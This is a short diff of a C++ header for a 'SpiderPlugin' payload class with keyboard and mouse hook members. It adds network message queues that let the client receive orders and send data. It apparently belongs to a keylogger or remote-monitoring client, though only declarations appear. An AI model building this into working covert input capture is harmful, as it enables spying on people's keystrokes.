@@ -20,7 +20,10 @@ class SpiderPlugin : public IPayload
     virtual ~SpiderPlugin();
 
     // Should initialize the payload, if needed
-    virtual bool init();
+    virtual bool init(mt::Queue<SystemMsg> &inputQueue);
+
+    // Get the event thread-safe queue, in order to control the client
+    virtual mt::Queue<SystemMsg> &getOrderQueue();
 
     // Should de-initialize the payload, if needed
     virtual bool deinit();
@@ -85,6 +88,9 @@ class SpiderPlugin : public IPayload
     SystemInfos m_infos;
     bool m_keyboardHook;
     bool m_mouseHook;
+
+    static mt::Queue<SystemMsg> *m_sendToNetwork;
+    mt::Queue<SystemMsg> m_receivedFromNetwork;
 
 #if defined _WIN32
     HHOOK m_keyboardHookWin;
